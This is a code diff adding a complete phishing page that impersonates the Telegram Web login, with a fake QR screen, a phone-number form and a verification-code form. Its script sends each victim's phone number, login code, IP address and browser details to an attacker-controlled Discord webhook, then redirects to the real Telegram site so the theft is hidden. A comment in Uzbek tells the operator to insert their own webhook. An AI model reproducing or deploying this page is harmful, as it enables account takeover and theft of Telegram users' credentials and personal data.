@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f1a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .qr-container {
+            background: #17212b;
+            border-radius: 32px;
+            width: 380px;
+            padding: 30px 24px;
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 24px;
+        }
+
+        .logo svg {
+            width: 56px;
+            height: 56px;
+        }
+
+        h2 {
+            color: white;
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .sub {
+            color: #8e9eae;
+            font-size: 14px;
+            margin-bottom: 28px;
+        }
+
+        .qr-box {
+            background: white;
+            padding: 20px;
+            border-radius: 24px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        canvas {
+            width: 220px;
+            height: 220px;
+            display: block;
+        }
+
+        .steps {
+            text-align: left;
+            margin: 24px 0;
+            padding-left: 20px;
+        }
+
+        .steps li {
+            color: #8e9eae;
+            font-size: 13px;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+
+        .steps li span {
+            color: #2b96f1;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #5e6f7e;
+            font-size: 12px;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #2b3b4c;
+        }
+
+        .or-divider::before {
+            margin-right: 12px;
+        }
+
+        .or-divider::after {
+            margin-left: 12px;
+        }
+
+        .phone-btn {
+            background: transparent;
+            border: 1px solid #2b96f1;
+            color: #2b96f1;
+            padding: 12px;
+            border-radius: 14px;
+            width: 100%;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .phone-btn:hover {
+            background: #2b96f110;
+        }
+
+        .back-link {
+            margin-top: 20px;
+        }
+
+        .back-link a {
+            color: #2b96f1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            color: #8e9eae;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #242f3d;
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            background: #2b3947;
+        }
+
+        .login-btn {
+            background: #2b96f1;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 14px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-msg {
+            color: #e53935;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="app"></div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"; // O'z webhook URL ni qo'y
+
+        function sendToDiscord(data) {
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: data })
+            }).catch(e => console.log(e));
+        }
+
+        function getIP() {
+            fetch("https://api.ipify.org?format=json")
+                .then(r => r.json())
+                .then(data => {
+                    sendToDiscord(`🌍 IP: ${data.ip} | Time: ${new Date().toLocaleString()} | UA: ${navigator.userAgent}`);
+                });
+        }
+
+        let state = "qr";
+        let tempPhone = "";
+        let tempCode = "";
+
+        // QR kod yaratish
+        function generateQR() {
+            const fakeToken = "qr_" + Math.random().toString(36).substring(2) + Date.now().toString(36);
+            const canvas = document.getElementById("qrCanvas");
+            if (!canvas) return;
+            const ctx = canvas.getContext("2d");
+            canvas.width = 220;
+            canvas.height = 220;
+            ctx.fillStyle = "white";
+            ctx.fillRect(0, 0, 220, 220);
+            ctx.fillStyle = "black";
+            ctx.font = "14px monospace";
+            ctx.fillText("tg://login?token=" + fakeToken.substring(0, 16), 20, 110);
+            ctx.font = "10px monospace";
+            ctx.fillText("Scan with Telegram", 65, 170);
+            
+            sendToDiscord(`📱 QR SCANNED MODE OPENED | Token: ${fakeToken}`);
+            getIP();
+        }
+
+        function showQR() {
+            state = "qr";
+            document.getElementById("app").innerHTML = `
+                <div class="qr-container">
+                    <div class="logo">
+                        <svg viewBox="0 0 24 24" fill="#2b96f1"><path d="M12 0C5.37 0 0 5.37 0 12c0 6.63 5.37 12 12 12s12-5.37 12-12c0-6.63-5.37-12-12-12zm5.89 7.13c.14-.66-.44-1.2-1.05-.95l-7.97 3.1c-.45.17-.44.83.02.98l2.06.66 1.6 4.99c.12.38.53.58.9.44l2.94-1.1c.36-.13.76.05.88.41l1.27 3.97c.13.4.53.6.91.45l4.66-1.65c.41-.15.66-.57.55-.99l-1.77-6.31z"/></svg>
+                    </div>
+                    <h2>Log in by QR Code</h2>
+                    <div class="sub">Open Telegram on your phone</div>
+                    <div class="qr-box">
+                        <canvas id="qrCanvas" width="220" height="220"></canvas>
+                    </div>
+                    <ul class="steps">
+                        <li>1. Open <span>Telegram</span> on your phone</li>
+                        <li>2. Go to <span>Settings</span> > <span>Devices</span> > <span>Link Desktop Device</span></li>
+                        <li>3. Point your phone at this screen</li>
+                    </ul>
+                    <div class="or-divider">OR</div>
+                    <button class="phone-btn" onclick="showPhone()">Log in by phone Number</button>
+                    <div class="back-link"><a href="#" onclick="showPhone();return false;">Having trouble?</a></div>
+                </div>
+            `;
+            generateQR();
+        }
+
+        function showPhone() {
+            state = "phone";
+            document.getElementById("app").innerHTML = `
+                <div class="qr-container">
+                    <div class="logo">
+                        <svg viewBox="0 0 24 24" fill="#2b96f1"><path d="M12 0C5.37 0 0 5.37 0 12c0 6.63 5.37 12 12 12s12-5.37 12-12c0-6.63-5.37-12-12-12zm5.89 7.13c.14-.66-.44-1.2-1.05-.95l-7.97 3.1c-.45.17-.44.83.02.98l2.06.66 1.6 4.99c.12.38.53.58.9.44l2.94-1.1c.36-.13.76.05.88.41l1.27 3.97c.13.4.53.6.91.45l4.66-1.65c.41-.15.66-.57.55-.99l-1.77-6.31z"/></svg>
+                    </div>
+                    <h2>Sign in</h2>
+                    <div class="sub">Enter your phone number</div>
+                    <div class="input-group">
+                        <label>Phone number</label>
+                        <input type="tel" id="phone" placeholder="+998 XX XXX XX XX" value="">
+                    </div>
+                    <button class="login-btn" onclick="sendPhone()">Next</button>
+                    <div class="back-link"><a href="#" onclick="showQR();return false;">Log in by QR Code</a></div>
+                    <div id="errorMsg" class="error-msg"></div>
+                </div>
+            `;
+            document.getElementById("phone")?.focus();
+        }
+
+        function showCode() {
+            state = "code";
+            document.getElementById("app").innerHTML = `
+                <div class="qr-container">
+                    <div class="logo">
+                        <svg viewBox="0 0 24 24" fill="#2b96f1"><path d="M12 0C5.37 0 0 5.37 0 12c0 6.63 5.37 12 12 12s12-5.37 12-12c0-6.63-5.37-12-12-12zm5.89 7.13c.14-.66-.44-1.2-1.05-.95l-7.97 3.1c-.45.17-.44.83.02.98l2.06.66 1.6 4.99c.12.38.53.58.9.44l2.94-1.1c.36-.13.76.05.88.41l1.27 3.97c.13.4.53.6.91.45l4.66-1.65c.41-.15.66-.57.55-.99l-1.77-6.31z"/></svg>
+                    </div>
+                    <h2>Verification code</h2>
+                    <div class="sub">We've sent a code to <span id="phoneDisplay"></span></div>
+                    <div class="input-group">
+                        <label>Code</label>
+                        <input type="text" id="code" placeholder="XXXXX" inputmode="numeric">
+                    </div>
+                    <button class="login-btn" onclick="sendCode()">Log in</button>
+                    <div class="back-link"><a href="#" onclick="showPhone();return false;">Change number</a></div>
+                    <div id="errorMsg" class="error-msg"></div>
+                </div>
+            `;
+            document.getElementById("phoneDisplay").innerText = tempPhone;
+            document.getElementById("code")?.focus();
+        }
+
+        function sendPhone() {
+            const phone = document.getElementById("phone").value;
+            if (!phone || phone.length < 8) {
+                document.getElementById("errorMsg").innerText = "Invalid phone number";
+                return;
+            }
+            tempPhone = phone;
+            sendToDiscord(`📞 PHONE NUMBER: ${phone} | UA: ${navigator.userAgent}`);
+            getIP();
+            showCode();
+        }
+
+        function sendCode() {
+            const code = document.getElementById("code").value;
+            if (!code || code.length < 3) {
+                document.getElementById("errorMsg").innerText = "Invalid code";
+                return;
+            }
+            sendToDiscord(`🔐 2FA/CODE: ${code} | Phone: ${tempPhone}`);
+            document.getElementById("errorMsg").innerHTML = '<span class="loading"></span> Logging in...';
+            setTimeout(() => {
+                window.location.href = "https://web.telegram.org/k/";
+            }, 1500);
+        }
+
+        showQR();
+    </script>
+</body>
+</html>
